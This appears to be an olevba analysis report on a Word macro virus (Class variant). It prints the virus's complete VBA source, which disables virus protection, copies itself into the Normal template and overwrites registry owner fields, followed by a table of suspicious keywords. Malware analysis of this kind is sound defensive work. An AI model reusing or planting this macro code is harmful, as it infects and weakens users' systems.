olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-97227c0ed1626f444678cf79dcf145b3668e0fb8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-97227c0ed1626f444678cf79dcf145b3668e0fb8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Const REG_SZ As Long = 1
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Const HKEY_CURRENT_USER As Long = &H80000001
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Sub AutoOpen()
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
On Error GoTo out
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Options.VirusProtection = False
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Options.SaveNormalPrompt = False
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Options.ConfirmConversions = False
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
If nt > 70 And ad > 0 Then GoTo out
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
If nt < 70 Then
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
End If
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
host.codemodule.AddFromFile ("c:\class.sys")
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
With host.codemodule
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    For x = 1 To 16
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    .deletelines 1
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    Next x
'sen3/30/99 5:27:12 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
End With
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
If nt < 70 Then
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    With host.codemodule
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    .replaceline 1, "Sub AutoClose()"
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    .replaceline 91, "Sub ToolsMacro()"
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    For x = 70 To 81
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
        .deletelines 62
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    Next x
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    .replaceline 35, "    For x = 1 To 4"
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    End With
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
End If
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
If nt < 70 Then
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
u = RegCloseKey(k)
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
End If
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
With host.codemodule
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    For x = 2 To 104 Step 2
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
    Next x
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
End With
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
out:
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
End Sub
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
Sub ViewVBCode()
'sen3/30/99 5:27:13 PMHP LaserJet 4MV on \\RENTS\HPLASERJDocument1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

